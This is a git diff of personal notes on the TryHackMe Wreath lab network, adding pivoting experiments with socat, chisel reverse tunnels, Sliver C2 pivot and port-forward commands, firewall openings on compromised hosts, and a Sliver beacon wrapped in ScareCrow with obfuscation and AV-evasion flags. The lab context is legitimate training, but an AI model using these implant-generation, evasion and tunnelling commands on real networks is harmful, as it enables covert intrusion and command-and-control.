@@ -21,11 +21,12 @@ dos2unix $file
 `sed -i 's/\r//'`
 ```
 - CentOS has a restrictive firewall
-
+- more chisel and where I was going wrong! 
+- Why C2 have there own portfwd and pivoting 
 Beyond Root:
 - Do the report like a professional
 - Prep reporting for further Offsec certs 2023!
-- Better  proxychains portscanning or more stealthier / elegant ways  to postscan internal networks. 
+- Better proxychains portscanning or more stealthier / elegant ways to postscan internal networks. 
 - BestInSlot CS for myself for copy and paste
 
 - [[Wreath-Notes.md]]
@@ -363,7 +364,7 @@ Scan the hosts -- which one does _not_ return a status of "filtered" for every p
 
 Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?  
 ```
-
+80,3389,5985
 ```
 
 Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
@@ -644,8 +645,128 @@ Scan the top 50 ports of the last IP address you found in Task 17. Which ports a
 ```
 #### Task 34 Personal PC Pivoting
 
-For some reason my sliver beacon broke, but it was not Windows Defender as the file had not been quantined
+For some reason my sliver beacon broke, but it was not Windows Defender as the file had not been quarantined. Returning again after thinking about my infrastructure.
 
+Socat relay
+![](finallysocattotherescue.png)
+
+I really want to use chisel for sliver before I trying `portfwd` commands in sliver. I tried and learnt the limits of socats and the expansive area I have yet to cover with that tool
+```bash
+https://gist.github.com/fsodogandji/8521333 - tunnel from a proxy
+socat TCP4-L:10005,reuseaddr,fork,bind=127.0.1.1 PROXY:127.0.0.1,proxyport=10005
+# Installs a simple TCP port forwarder. With TCP4-LISTEN it listens on local port "www" until a connection comes in, accepts it,|
+#The service running on 172.16.245.11:5432 is forward to 172.16.251.139:5666|
+socat -d -d -lmlocal2 TCP4-LISTEN:5666,bind=172.16.251.139,su=nobody,fork,reuseaddr TCP4:172.16.245.11:5432
+```
+
+Sliver [Pivots](https://github.com/BishopFox/sliver/wiki/Pivots) != [Port-Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding); Pivots are for C2 traffic, `portfwd` is *for tunneling generic tcp connections into a target environment.*
+
+[Pivoting](https://github.com/BishopFox/sliver/wiki/Pivots) - C2 Traffic
+```go
+// Requires interactive session
+// List pivots
+pivots 
+// Start a tcp pivots on the current session
+// default listener is on 9898
+pivots tcp 
+pivots tcp  --bind 0.0.0.0
+// Generate an implant that will connect to the pivot listener
+generate --tcp-pivot 192.168.1.1:9898
+```
+
+[Port-Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding) - Tunneling generic tcp connections
+```go
+// By default all port forwards will be bound to the `127.0.0.1` interface, but you can override this using the `--bind` flag
+// Local port forward
+portfwd add --remote 10.10.10.10:22
+// Reverse Port forward
+rportfwd add --remote 10.10.10.10:22
+// `wg-portfwd` WireGuard Port Foward requires WireGuard 
+```
+
+Sadly no pivoting
+![](sadpivots.png)
+
+Created this
+```bash
+generate beacon --tcp-pivot  10.200.57.200:9898 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S-Pivot.bin -f shellcode -G
+/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S-Pivot.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+```
+But it did not work I:
+- add firewall rules for both
+
+Nevermind I tried atleast I will look into why further and I am sure there is a xct patreon labs walk thorough for a machine that he use sliver with and `pivot` or `porfwd`.
+
+```bash
+# Prod
+nohup ./chisel client 10.50.55.42:10000 10004:10.200.57.200:10004:socks &
+firewall-cmd --zone=public --add-port 10004/tcp
+```
+
+```powershell
+# Git
+netsh advfirewall firewall add rule name="nvm-chisel-04" dir=in action=allow protocol=tcp localport=10004
+netsh advfirewall firewall add rule name="nvm-chisel-04" dir=out action=allow protocol=tcp localport=10004
+
+start-job { .\chisel.exe client 10.200.57.200:10004 10004:socks  }
+```
+
+## Chisel Confusions
+
+Multiple article bamboozed me and I must have failed to add this, because some how the final box is externally facing and I must not reread that I missed one thing and that one thing was this: https://ap3x.github.io/posts/pivoting-with-chisel/ https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5445s
+```bash
+# Kali
+server -p 10000
+client 127.0.0.1:10004 socks
+# Prod
+client kali:10000 R:10004:127.0.0.1:11000
+server -p 10000 --socks5
+```
+Basically tmux pane pains. This becomes:
+
+```bash
+# Kali
+client 127.0.0.1:10011 socks
+# Prod
+firewall-cmd --zone=public --add-port 11000/tcp
+nohup ./chisel client 10.50.55.42:10000 R:10004:127.0.0.1:11000 &
+nohup ./chisel server -host 10.200.57.200 -p 11000 --reverse  &
+```
+
+```bash
+# Kali <-> Box 1 <-> Box 2 <-> Box 3 
+# Server
+# Client Reverse -> Remote Server
+# Client Sock -> Local Server
+
+
+
+# Kali
+./chisel server -host 10.50.55.42 --reverse --socks5 -p 10000 
+./chisel client 127.0.0.1:10011 socks # $Kaliclient_pivot_toBox2
+./chisel client 127.0.0.1:10012 socks # $Kaliclient_pivot_toBox3
+# Box 1 <-> Kali
+nohup ./chisel client 10.50.55.42:10000 10001:socks
+
+
+# Box 1 server for pivoting from Box 2
+./chisel server -host 10.200.57.200 --reverse --socks5 -p 11000
+# Connect back to the server on kali through $Kaliclient on 127.0.0.1:10011
+nohup ./chisel client 10.50.55.42:10000 R:10011:127.0.0.1:11000 &
+
+# Box 2 -> Box 1 -> Kali
+# Box 1
+nohup ./chisel client 127.0.0.1:11012 socks & # $Box1client
+nohup ./chisel client 10.50.55.42:10000 R:10011:127.0.0.1:11011 & # $Kaliclient_pivottoBox3
+# Box 2
+./chisel server -host 10.200.57.150 --reverse --socks5 -p 12000 
+# Connect back to the server on Box 1 through $Box1client on 127.0.0.1:11012
+nohup ./chisel client 10.200.57.200:11000 R:11012:127.0.0.1:12000 &
+# Box 3 10.200.57.100 
+# shell 10.200.57.150 1200?
+
+```
 
 #### Task 35 Personal PC The Wonders of Git
 
@@ -741,3 +862,50 @@ Password
 
 #### Task 45 Conclusion Debrief & Report
 
+## Beyond Root
+
+#### Socat proxy
+
+```bash
+https://gist.github.com/fsodogandji/8521333 - tunnel from a proxy
+socat TCP4-L:10005,reuseaddr,fork,bind=127.0.1.1 PROXY:127.0.0.1,proxyport=10005
+# Installs a simple TCP port forwarder. With TCP4-LISTEN it listens on local port "www" until a connection comes in, accepts it,|
+#The service running on 172.16.245.11:5432 is forward to 172.16.251.139:5666|
+socat -d -d -lmlocal2 TCP4-LISTEN:5666,bind=172.16.251.139,su=nobody,fork,reuseaddr TCP4:172.16.245.11:5432
+```
+
+#### Windows Backgrounding
+
+```powershell
+start /B $command
+start-job { $command }
+```
+
+
+#### Sliver
+
+Although not successful in someways I learnt alot
+Sliver [Pivots](https://github.com/BishopFox/sliver/wiki/Pivots) != [Port-Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding); Pivots are for C2 traffic, `portfwd` is *for tunneling generic tcp connections into a target environment.*
+
+[Pivoting](https://github.com/BishopFox/sliver/wiki/Pivots) - C2 Traffic
+```go
+// Requires interactive session
+// List pivots
+pivots 
+// Start a tcp pivots on the current session
+// default listener is on 9898
+pivots tcp 
+pivots tcp  --bind 0.0.0.0
+// Generate an implant that will connect to the pivot listener
+generate --tcp-pivot 192.168.1.1:9898
+```
+
+[Port-Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding) - Tunneling generic tcp connections
+```go
+// By default all port forwards will be bound to the `127.0.0.1` interface, but you can override this using the `--bind` flag
+// Local port forward
+portfwd add --remote 10.10.10.10:22
+// Reverse Port forward
+rportfwd add --remote 10.10.10.10:22
+// `wg-portfwd` WireGuard Port Foward requires WireGuard 
+```
